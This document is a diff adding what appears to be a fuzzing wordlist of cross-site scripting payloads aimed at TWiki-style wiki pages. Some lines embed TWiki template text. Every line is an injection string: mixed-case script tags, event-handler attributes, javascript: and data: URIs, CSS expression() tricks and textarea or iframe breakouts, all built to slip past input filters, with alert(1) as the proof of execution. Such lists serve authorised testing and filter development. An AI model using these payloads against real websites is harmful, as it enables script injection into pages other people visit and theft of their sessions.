@@ -1,0 +1,100 @@
+Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <code>%TOPICLIST{" &nbsp; * web.name"}%</code> creates a bullet list of all topics.<a style=background:url(javascript:alert(1))
+data:text/html,<script>alert(1)</script>Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <code>%TOPICLIST{" &nbsp; * web.name"}%</code> creates a bullet list of all topics.
+javascript:alert(1); // Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <code>%TOPICLIST{" &nbsp; * web.name"}%</code> creates a bullet list of all topics.
+javascript:alert(1)// <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>
+javascript:alert`1`; // <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>
+<code>%STARTINCLUDE%</code>TWiki<style=background:url(javascript(1))
+ ' oneRroR=alert(1);' TWiki
+ ' oneRroR=alert`1`;' TWiki
+ onErRor=alert(1); TWiki
+ onerror=alert`1`; TWiki
+ onErRor=alert`1`; TWiki
+ onmouSemoVe=alert(1); TWiki
+ onmousemove=alert`1`; TWiki
+ onmouSemoVe=alert`1`; TWiki
+--><ScRipt>alert(1);</sCriPt><th align="center" bgcolor="#99CCCC"> <strong><a href="FileAttachment">Attachment</a>:</strong>
+--><ScRipt>alert`1`;</sCriPt><th align="center" bgcolor="#99CCCC"> <strong><a href="FileAttachment">Attachment</a>:</strong>
+; alert();// TWiki
+; alert``;// TWiki
+;alert(1); TWiki
+;alert(1);&#39;
+';!--'<XSS>=&{(1)}``\'
+' /><frame src='jaVasCriPt:alert(1);'><!-- Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <code>%TOPICLIST{" &nbsp; * web.name"}%</code> -->
+' /><frame src='javascript:alert`1`;'><!-- Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <code>%TOPICLIST{" &nbsp; * web.name"}%</code> -->
+' /><frame src='jaVasCriPt:alert`1`;'><!-- Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <code>%TOPICLIST{" &nbsp; * web.name"}%</code> -->
+' oneRroR=alert(1);'
+' oneRroR=alert`1`;'
+' onmousEmovE=alert(1); 
+' onmousEmovE=alert(1);'
+' onmousEmovE=alert`1`; 
+' onmousEmovE=alert`1`;'
+'; alert();//
+'; alert``;//
+';alert(1);'
+';alert(document.domain)//
+''' style='background:url(jaVasCriPt:alert(1))' '
+<img src=JaVaScRiPt:alert(1)>
+'<s>'><img src='JaVaScRiPt:alert(1)'>
+'<s>'><ScrIpt>alert(1)</sCriPt>
+'></iframe><ScrIpt>alert(1);</sCriPt>
+'></iframe><ScrIpt>alert`1`;</sCriPt>
+'><frame src='JaVaScRiPt:alert(1)'>
+'><frame src='JaVaScRiPt:alert`1`'>
+'><ScrIpt>alert(1);</sCriPt>
+'><ScrIpt>alert`1`;</sCriPt>
+'oNcLiCk='alert(1)'
+'oNcLiCk='alert`1`'
+'oNcLiCk='alert(1)' 'onFocus='alert(1)'
+'oNcLiCk='alert`1`' 'onFocus='alert`1`'
+'onFocus='alert`1`'
+'onFocusOut='alert`1`'
+'onMouseDown='alert`1`'
+'onMouseEnter='alert`1`'
+'onMouseEnter='alert`1`' 'onMouseDown='alert`1`'
+'onMouseLeave='alert`1`'
+'onMouseLeave='alert`1`' 'onMouseOut='alert`1`'
+'onMouseMove='alert`1`'
+'onMouseMove='alert`1`' 'onFocusOut='alert`1`'
+'onMouseOut='alert`1`'
+'onMouseUp='alert`1`'
+'onMouseWheel='alert`1`'
+'onMouseWheel='alert`1`' 'onMouseUp='alert`1`'
+<![CDATA['><script>alert`1`</script><!--]]>
+</textarea><img src=x onErroR=alert(1);>
+</textarea><img src=x onErroR=alert`1`;>
+</textarea><sCriPt>alert(1);</ScrIpt>
+</textarea><sCriPt>alert`1`;</ScrIpt>
+<<script>alert`1`;<</script>
+<a onMoUseOver='alert(1)'>XSS</a>
+<a onmouseover='alert`1`'>XSS</a>
+<a onMoUseOver='alert`1`'>XSS</a>
+<a onmouseover=alert`1`>XSS</a>
+<a onMoUseOver=alert`1`>XSS</a>
+<b <script>alert`1`</script>0
+<b>aaaa<script<b></b><alert`1`</script </b>
+<div style='color:expression(alert`1`);'>a</div>
+<div style='left:exp/* */ression(alert`1`)'>
+<div style='left:expression(alert`1`)'>
+<div/style='width:expression(alert`1`)'>x</div>
+<iframe src='data:text/html,<script>alert`1`</script>'></iframe>
+<iframe src='javascript:alert`1`;'></iframe>
+<iframe src='jaVaScRiPt:alert(1);'></iframe>
+<iframe src='jaVaScRiPt:alert`1`;'></iframe>
+<iframe src='x' style=width:exp/**/ressi/**/on(alert`1`)>
+<iframe src=# onmouseover='alert`1`'></iframe>
+<img src=x onErRor=alert(1);>
+<img src=x onErRor=alert`1`;>
+<object data='data:text/html,<script>alert`1`</script>'></object>
+<q/oncopy=alert`1`
+<q/oncut=alert`1`
+<s oncopy= alert`1`>a
+<s oncut= alert`1`>a
+<s><script>alert`1`</script>
+<s>><img src='javascript:alert`1`>
+<ScrIpt>alert`1`;</SCript>
+><s><img src='javascript:alert`1`>
+><s><img src='jaVaScrIpT:alert(1)>
+><s><img src='jaVaScrIpT:alert`1`>
+a style=background:url(javascript:alert`1`) 
+a style=background:url(jaVaScRiPt:alert(1)) 
+a style=background:url(jaVaScRiPt:alert`1`) 
